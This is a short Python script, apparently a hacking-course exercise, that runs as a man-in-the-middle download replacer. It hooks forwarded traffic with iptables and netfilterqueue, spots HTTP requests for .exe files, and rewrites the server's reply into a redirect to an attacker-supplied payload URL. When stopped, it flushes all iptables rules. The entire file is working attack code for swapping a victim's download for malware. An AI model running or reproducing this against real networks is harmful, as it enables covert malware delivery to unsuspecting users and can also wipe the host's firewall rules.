#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL or IP to redirect your target to.")
    parser.add_argument("-f", "--file", dest="file", help="Please select a valid payload file.")
    options = parser.parse_args()
    if not options.url:
        parser.error("[-] Please specify a URL or IP to redirect your target to.")
    if not options.file:
        parser.error("[-] Please specify a payload file.")
    return options


options = get_arguments()
url = options.url
payload_file = options.file

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print "[+] EXE Request"
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print "[+] Replacing File"
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + url + payload_file + "\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


try:
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C \n")
    subprocess.call(["iptables", "--flush"])

